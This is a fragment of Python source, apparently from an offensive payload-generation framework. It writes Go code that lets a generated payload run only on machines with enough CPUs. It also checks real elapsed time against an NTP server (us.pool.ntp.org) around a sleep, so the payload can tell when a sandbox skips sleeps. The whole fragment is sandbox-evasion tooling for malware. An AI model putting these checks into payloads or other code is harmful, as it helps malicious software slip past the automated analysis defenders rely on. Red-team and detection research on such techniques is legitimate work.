        if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":
            check_code += rand_processor + " := runtime.NumCPU()\n"
            check_code += "if " + rand_processor + " >= " + evasion_payload.required_options["PROCESSORS"][0] + " {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
            check_code += 'type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}\n'
            check_code += 'sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()\n'
            check_code += 'ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b\n'
            check_code += 'binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)\n'
            check_code += 'val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))\n'
            check_code += 'time.Sleep(time.Duration(' + evasion_payload.required_options["SLEEP"][0] + '*1000) * time.Millisecond)\n'
            check_code += 'newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()\n'
            check_code += 'second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b\n'
            check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
            check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + evasion_payload.required_options["SLEEP"][0] + ' {'
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    else:
        return '', 0
